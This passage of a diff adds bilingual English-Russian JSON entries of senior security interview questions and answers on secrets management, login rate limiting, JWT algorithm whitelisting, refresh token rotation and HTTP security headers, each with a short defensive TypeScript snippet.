+      "en": "### Secrets Management Strategy\n\nUse a secrets manager (Vault, AWS Secrets Manager) instead of environment variables, enable pre-commit hooks to scan for secrets, and implement automated rotation. Never store secrets in code or version control; rotate them before expiration.\n\n```typescript\n// Setup with Vault\nimport vault from '@hashicorp/vault';\n\nconst getSecret = async (path: string) => {\n  const client = new vault.ApiClient({ endpoint: process.env.VAULT_ADDR });\n  return await client.read(path);\n};\n\n// .gitignore + pre-commit hook\n// .env, secrets.json, *.pem\n\n// Rotation: request new secret, update clients, revoke old\nawait rotateSecret('database/password');\n```\n\n**Common interview trap:** Thinking environment variables are secure enough—they're visible in logs and process listings.",
+      "ru": "### Стратегия Управления Секретами\n\nИспользуйте менеджер секретов (Vault, AWS Secrets Manager) вместо переменных окружения, включите pre-commit hooks для сканирования секретов и реализуйте автоматическую ротацию. Никогда не храните секреты в коде или контроле версий; ротируйте их перед истечением.\n\n```typescript\n// Установка с Vault\nimport vault from '@hashicorp/vault';\n\nconst getSecret = async (path: string) => {\n  const client = new vault.ApiClient({ endpoint: process.env.VAULT_ADDR });\n  return await client.read(path);\n};\n\n// .gitignore + pre-commit hook\n// .env, secrets.json, *.pem\n\n// Ротация: запрос нового секрета, обновление клиентов, отзыв старого\nawait rotateSecret('database/password');\n```\n\n**Типичная ошибка:** Думать, что переменные окружения безопасны—они видны в логах и списках процессов."
+    },
+    "tags": [
+      "secrets-management",
+      "vault",
+      "secret-rotation",
+      "environment-variables"
+    ]
+  },
+  {
+    "id": "security-q-20",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Design a rate limiting strategy that prevents brute force attacks on login endpoints while being fair to legitimate users. How would you handle distributed attacks and implement backoff strategies?",
+      "ru": "Спроектируйте стратегию rate limiting, которая предотвращает brute force атаки на endpoints логина, но при этом справедлива к легитимным пользователям. Как вы будете обрабатывать распределённые атаки и реализовывать exponential backoff?"
+    },
+    "answer": {
+      "en": "### Rate Limiting Strategy\n\nImplement token bucket or sliding window rate limiters per user/IP, use progressive delays (exponential backoff), and track failed attempts with account lockout thresholds. Use distributed Redis for cross-server state and CAPTCHA after repeated failures.\n\n```typescript\nconst rateLimiter = async (identifier: string, limit: number, window: number) => {\n  const key = `ratelimit:${identifier}`;\n  const attempts = await redis.incr(key);\n  if (attempts === 1) await redis.expire(key, window);\n  \n  if (attempts > limit) {\n    const lockoutTime = Math.min(300, Math.pow(2, attempts - limit));\n    await redis.setex(`lockout:${identifier}`, lockoutTime, '1');\n    throw new Error(`Too many attempts. Retry after ${lockoutTime}s`);\n  }\n};\n\n// Per-user and per-IP limits\nawait rateLimiter(`user:${userId}`, 5, 300); // 5 attempts per 5 min\nawait rateLimiter(`ip:${ip}`, 20, 300);      // 20 attempts per 5 min\n```\n\n**Common interview trap:** Only rate limiting by IP (distributed attacks bypass this)—you need per-user limits and behavioral analysis.",
+      "ru": "### Стратегия Rate Limiting\n\nРеализуйте token bucket или sliding window rate limiters на пользователя/IP, используйте прогрессивные задержки (exponential backoff) и отслеживайте неудачные попытки с порогами блокировки. Используйте распределённый Redis для состояния между серверами и CAPTCHA после повторных ошибок.\n\n```typescript\nconst rateLimiter = async (identifier: string, limit: number, window: number) => {\n  const key = `ratelimit:${identifier}`;\n  const attempts = await redis.incr(key);\n  if (attempts === 1) await redis.expire(key, window);\n  \n  if (attempts > limit) {\n    const lockoutTime = Math.min(300, Math.pow(2, attempts - limit));\n    await redis.setex(`lockout:${identifier}`, lockoutTime, '1');\n    throw new Error(`Too many attempts. Retry after ${lockoutTime}s`);\n  }\n};\n\n// Лимиты на пользователя и на IP\nawait rateLimiter(`user:${userId}`, 5, 300); // 5 попыток за 5 мин\nawait rateLimiter(`ip:${ip}`, 20, 300);      // 20 попыток за 5 мин\n```\n\n**Типичная ошибка:** Только rate limiting по IP (распределённые атаки это обходят)—нужны лимиты на пользователя и анализ поведения."
+    },
+    "tags": [
+      "rate-limiting",
+      "brute-force-protection",
+      "exponential-backoff",
+      "distributed-systems"
+    ]
+  },
+  {
+    "id": "security-q-21",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain JWT algorithm confusion attacks and how to prevent them. What's the difference between 'none' algorithm vulnerability and algorithm confusion, and how would you validate tokens securely?",
+      "ru": "Объясните атаки на JWT с подменой алгоритма и способы их предотвращения. В чём разница между уязвимостью алгоритма 'none' и подменой алгоритма? Как безопасно валидировать токены?"
+    },
+    "answer": {
+      "en": "### JWT Algorithm Validation\n\nAlgorithm confusion occurs when an attacker changes the algorithm header (e.g., HS256 to 'none' or RS256 to HS256). Always explicitly validate the algorithm on the server side and reject tokens with unexpected algorithms. The 'none' algorithm is a special case where no signature is required, which is always a security risk in production.\n\n```typescript\nimport jwt from 'jsonwebtoken';\n\nconst verifyToken = (token: string, publicKey: string) => {\n  try {\n    return jwt.verify(token, publicKey, {\n      algorithms: ['RS256'], // Whitelist allowed algorithms\n      ignoreExpiration: false,\n    });\n  } catch (err) {\n    throw new Error('Invalid token');\n  }\n};\n```\n\n**Common interview trap:** Assuming jwt.verify() automatically prevents algorithm confusion—it doesn't without explicit algorithm whitelisting.",
+      "ru": "### Валидация алгоритма JWT\n\nПодмена алгоритма происходит, когда злоумышленник меняет заголовок алгоритма (например, HS256 на 'none' или RS256 на HS256). Всегда явно валидируйте алгоритм на сервере и отклоняйте токены с неожиданными алгоритмами. Алгоритм 'none' — частный случай, где подпись не требуется, что всегда является уязвимостью в продакшене.\n\n```typescript\nimport jwt from 'jsonwebtoken';\n\nconst verifyToken = (token: string, publicKey: string) => {\n  try {\n    return jwt.verify(token, publicKey, {\n      algorithms: ['RS256'], // Белый список разрешённых алгоритмов\n      ignoreExpiration: false,\n    });\n  } catch (err) {\n    throw new Error('Invalid token');\n  }\n};\n```\n\n**Типичная ошибка:** Предположение, что jwt.verify() автоматически предотвращает подмену алгоритма — это не так без явного списка разрешённых алгоритмов."
+    },
+    "tags": [
+      "jwt-algorithm-confusion",
+      "authentication",
+      "token-validation"
+    ]
+  },
+  {
+    "id": "security-q-22",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Design a secure refresh token rotation strategy. What are the key considerations for storing refresh tokens, rotating them on each use, and detecting token reuse attacks?",
+      "ru": "Спроектируйте безопасную стратегию ротации refresh токенов. Каковы ключевые соображения для хранения refresh токенов, их ротации при каждом использовании и обнаружении атак повторного использования?"
+    },
+    "answer": {
+      "en": "### Refresh Token Rotation Strategy\n\nStore refresh tokens in an encrypted database with metadata (issued date, family ID for detecting reuse). On each token refresh, issue a new refresh token and invalidate the old one. If an old token is reused, invalidate the entire token family to detect compromised tokens. Use short expiration windows (7 days) and rotate tokens on every refresh request.\n\n```typescript\ninterface RefreshTokenRecord {\n  tokenHash: string;\n  familyId: string;\n  issuedAt: Date;\n  expiresAt: Date;\n  revoked: boolean;\n}\n\nconst rotateRefreshToken = async (oldToken: string) => {\n  const record = await db.findRefreshToken(oldToken);\n  if (record.revoked) throw new Error('Token family compromised');\n  \n  await db.revokeTokenFamily(record.familyId);\n  return generateNewRefreshToken(record.familyId);\n};\n```\n\n**Common interview trap:** Forgetting to invalidate the entire token family when reuse is detected, allowing an attacker to continue using compromised tokens.",
+      "ru": "### Стратегия ротации Refresh токенов\n\nХраните refresh токены в зашифрованной БД с метаданными (дата выпуска, семейный ID для обнаружения повторного использования). При каждом обновлении токена выдайте новый и инвалидируйте старый. Если старый токен используется повторно, инвалидируйте всё семейство токенов. Используйте короткие окна истечения (7 дней) и ротируйте при каждом запросе.\n\n```typescript\ninterface RefreshTokenRecord {\n  tokenHash: string;\n  familyId: string;\n  issuedAt: Date;\n  expiresAt: Date;\n  revoked: boolean;\n}\n\nconst rotateRefreshToken = async (oldToken: string) => {\n  const record = await db.findRefreshToken(oldToken);\n  if (record.revoked) throw new Error('Token family compromised');\n  \n  await db.revokeTokenFamily(record.familyId);\n  return generateNewRefreshToken(record.familyId);\n};\n```\n\n**Типичная ошибка:** Забыть инвалидировать всё семейство токенов при обнаружении повторного использования, позволяя злоумышленнику продолжать использовать скомпрометированные токены."
+    },
+    "tags": [
+      "refresh-token-rotation",
+      "token-reuse-detection",
+      "session-management"
+    ]
+  },
+  {
+    "id": "security-q-23",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "How would you audit and implement critical security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)? What are common misconfigurations and how do they impact security?",
+      "ru": "Как вы проводили бы аудит и реализацию критических заголовков безопасности (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)? Какие частые ошибки конфигурации и как они влияют на безопасность?"
+    },
+    "answer": {
+      "en": "### Security Headers Configuration\n\nImplement headers as middleware to enforce browser security policies. CSP prevents XSS by restricting script sources, HSTS forces HTTPS, X-Frame-Options prevents clickjacking, and X-Content-Type-Options prevents MIME-sniffing. Common mistakes include using 'unsafe-inline' in CSP (defeats the purpose), not setting max-age in HSTS, or using overly permissive policies.\n\n```typescript\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self' cdn.example.com\");\n  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n  next();\n});\n```\n\n**Common interview trap:** Setting CSP with 'unsafe-inline' defeats the entire purpose of preventing XSS attacks.",
+      "ru": "### Конфигурация заголовков безопасности\n\nРеализуйте заголовки как middleware для принудительного применения политик безопасности браузера. CSP предотвращает XSS, ограничивая источники скриптов, HSTS принуждает HTTPS, X-Frame-Options предотвращает clickjacking, X-Content-Type-Options предотвращает MIME-sniffing. Частые ошибки: использование 'unsafe-inline' в CSP (аннулирует цель), отсутствие max-age в HSTS, или слишком permissive политики.\n\n```typescript\napp.use((req, res, next) => {\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self' cdn.example.com\");\n  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n  next();\n});\n```\n\n**Типичная ошибка:** Установка CSP с 'unsafe-inline' аннулирует всю цель предотвращения атак XSS."
+    },
+    "tags": [
+      "security-headers",
+      "csp",
+      "hsts",
+      "clickjacking-prevention"
+    ]
+  },
+  {
+    "id": "security-q-24",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "Describe a comprehensive secrets management strategy for a fullstack application. How do you handle API keys, database credentials, and JWT secrets across development, staging, and production environments?",
+      "ru": "Опишите комплексную стратегию управления секретами для fullstack приложения. Как вы управляете API ключами, учетными данными БД и JWT секретами в окружениях разработки, staging и production?"
+    },
+    "answer": {
+      "en": "### Secrets Management Strategy\n\nNever commit secrets to version control. Use environment-specific vaults (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) for production and staging. In development, use local .env files (gitignored). Rotate secrets regularly, audit access logs, and use different keys per environment. Implement least-privilege access—services only get credentials they need.\n\n```typescript\nimport * as aws from 'aws-sdk';\n\nconst secretsManager = new aws.SecretsManager();\n\nconst getSecret = async (secretName: string) => {\n  const response = await secretsManager.getSecretValue({ SecretId: secretName }).promise();\n  return JSON.parse(response.SecretString);\n};\n\nconst dbPassword = await getSecret('prod/db-password');\nconst jwtSecret = await getSecret('prod/jwt-secret');\n```\n\n**Common interview trap:** Storing secrets in environment variables in Docker images—they're still visible in image layers and history.",
+      "ru": "### Стратегия управления секретами\n\nНикогда не коммитьте секреты в контроль версий. Используйте хранилища (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) для production и staging. В разработке используйте локальные .env файлы (в .gitignore). Ротируйте секреты регулярно, аудируйте логи доступа, используйте разные ключи для каждого окружения. Применяйте принцип наименьших привилегий.\n\n```typescript\nimport * as aws from 'aws-sdk';\n\nconst secretsManager = new aws.SecretsManager();\n\nconst getSecret = async (secretName: string) => {\n  const response = await secretsManager.getSecretValue({ SecretId: secretName }).promise();\n  return JSON.parse(response.SecretString);\n};\n\nconst dbPassword = await getSecret('prod/db-password');\nconst jwtSecret = await getSecret('prod/jwt-secret');\n```\n\n**Типичная ошибка:** Хранение секретов в переменных окружения Docker образов — они видны в слоях образа и истории."
+    },
+    "tags": [
+      "secrets-management",
+      "environment-variables",
+      "vault",
+      "credential-rotation"
+    ]
+  },
+  {
+    "id": "security-q-25",
+    "topicId": "security",
+    "difficulty": "senior",
+    "question": {
+      "en": "How would you implement intelligent rate limiting to prevent abuse while maintaining user experience? Discuss strategies for API endpoints, login attempts, and handling distributed attacks.",
+      "ru": "Как вы реализовали бы интеллектуальное ограничение частоты запросов для предотвращения злоупотреблений при сохранении UX? Обсудите стратегии для API эндпоинтов, попыток входа и обработки распределённых атак."
+    },
+    "answer": {
+      "en": "### Intelligent Rate Limiting Strategy\n\nImplement multi-level rate limiting: per-IP, per-user, and per-endpoint. Use sliding window with Redis for efficient tracking. Apply stricter limits on sensitive endpoints (login, password reset). Detect distributed attacks using geographic analysis and device fingerprinting. Return 429 status with Retry-After header. For login endpoints, use exponential backoff after failed attempts.\n\n```typescript\nimport RedisStore from 'rate-limit-redis';\nimport rateLimit from 'express-rate-limit';\n\nconst limiter = rateLimit({\n  store: new RedisStore({ client: redisClient, prefix: 'rl:' }),\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  keyGenerator: (req) => req.user?.id || req.ip,\n  handler: (req, res) => res.status(429).json({ message: 'Too many requests' }),\n});\n\napp.post('/login', rateLimit({ windowMs: 60000, max: 5 }), loginHandler);\n```\n\n**Common interview trap:** Using in-memory rate limiting in distributed systems—it doesn't account for traffic across multiple servers.",
+      "ru": "### Стратегия интеллектуального ограничения частоты\n\nРеализуйте многоуровневое ограничение: по IP, по пользователю и по эндпоинту. Используйте sliding window с Redis для эффек��ивного отслеживания. Применяйте строгие ограничения на чувствительные эндпоинты (вход, сброс пароля). Обнаруживайте распределённые атаки через геоанализ и fingerprinting устройств. Возвращайте статус 429 с заголовком Retry-After. Для входа используйте экспоненциальный backoff после неудачных попыток.\n\n```typescript\nimport RedisStore from 'rate-limit-redis';\nimport rateLimit from 'express-rate-limit';\n\nconst limiter = rateLimit({\n  store: new RedisStore({ client: redisClient, prefix: 'rl:' }),\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  keyGenerator: (req) => req.user?.id || req.ip,\n  handler: (req, res) => res.status(429).json({ message: 'Too many requests' }),\n});\n\napp.post('/login', rateLimit({ windowMs: 60000, max: 5 }), loginHandler);\n```\n\n**Типичная ошибка:** Использование in-memory rate limiting в распределённых системах — это не учитывает трафик через несколько серверов."
+    },
+    "tags": [
+      "rate-limiting",
+      "distributed-attacks",
+      "ddos-mitigation",
+      "redis"
+    ]
+  }
+]
